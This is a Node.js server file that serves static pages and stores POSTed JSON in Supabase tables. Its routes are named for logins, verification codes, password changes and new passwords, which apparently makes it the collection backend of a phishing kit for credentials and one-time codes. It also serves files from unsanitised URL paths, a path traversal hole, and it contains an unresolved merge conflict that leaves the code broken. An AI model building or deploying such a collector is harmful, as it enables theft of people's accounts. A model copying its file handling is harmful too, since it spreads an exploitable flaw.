// index.js
const http = require('http');
const fs = require('fs');
const path = require('path');
<<<<<<< HEAD
=const url = require('url');
=======
const url = require('url');
const { createClient } = require('@supabase/supabase-js');
>>>>>>> 890960c98b4abd31689a39f8fc74ef2323016ae0

const PORT = process.env.PORT || 5000;

// Initialize Supabase client
const supabase = createClient(
  'https://YOUR_PROJECT_ID.supabase.co',
  'YOUR_ANON_PUBLIC_API_KEY'
);

// Serve static files as before (HTML, CSS, JS, images, etc.)
function serveStaticFile(res, filePath) {
  const ext = path.extname(filePath).toLowerCase();
  const types = {
    '.html': 'text/html',
    '.css': 'text/css',
    '.js': 'text/javascript',
    '.json': 'application/json',
    '.png': 'image/png',
    '.jpg': 'image/jpeg',
    '.jpeg': 'image/jpeg',
    '.gif': 'image/gif',
    '.svg': 'image/svg+xml',
    '.ico': 'image/x-icon'
  };
  const contentType = types[ext] || 'application/octet-stream';

  fs.readFile(filePath, ext === '.html' || ext === '.css' || ext === '.js' || ext === '.json' ? 'utf8' : undefined, (err, data) => {
    if (err) {
      res.writeHead(404);
      return res.end('Not found');
    }
    res.writeHead(200, { 'Content-Type': contentType });
    res.end(data);
  });
}

// Map routes to Supabase table names
const routeMap = {
  '/save-login': 'logins',
  '/save-code': 'code',
  '/save-password-change': 'password_changes',
  '/save-verify-code': 'verify_codes',
  '/save-new-password': 'new_passwords'
};

async function handleSave(route, payload, res) {
  if (!routeMap[route]) {
    res.writeHead(404);
    return res.end('Endpoint not found');
  }
  try {
    const table = routeMap[route];
    const toInsert = { ...payload, timestamp: new Date().toISOString() };
    const { data, error } = await supabase.from(table).insert([toInsert]);
    if (error) throw error;
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ success: true, data }));
  } catch (err) {
    console.error(`Error saving to Supabase (${route}):`, err);
    res.writeHead(500, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ success: false, error: err.message }));
  }
}

const server = http.createServer((req, res) => {
  const parsed = url.parse(req.url);
  const route = parsed.pathname;

  // CORS setup
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    res.writeHead(204);
    return res.end();
  }

  if (req.method === 'POST') {
    let body = '';
    req.on('data', chunk => (body += chunk));
    return req.on('end', () => {
      try {
        const json = JSON.parse(body);
        return handleSave(route, json, res);
      } catch {
        res.writeHead(400);
        return res.end('Invalid JSON');
      }
    });
  }

  // Serve front-end files
  let filePath = route === '/' ? 'index.html' : route.slice(1);
  if (fs.existsSync(filePath) && fs.statSync(filePath).isFile()) {
    return serveStaticFile(res, filePath);
  }

  res.writeHead(404);
  res.end('Not found');
});

server.listen(PORT, '0.0.0.0', () => {
  console.log(`Server listening on port ${PORT}`);
});
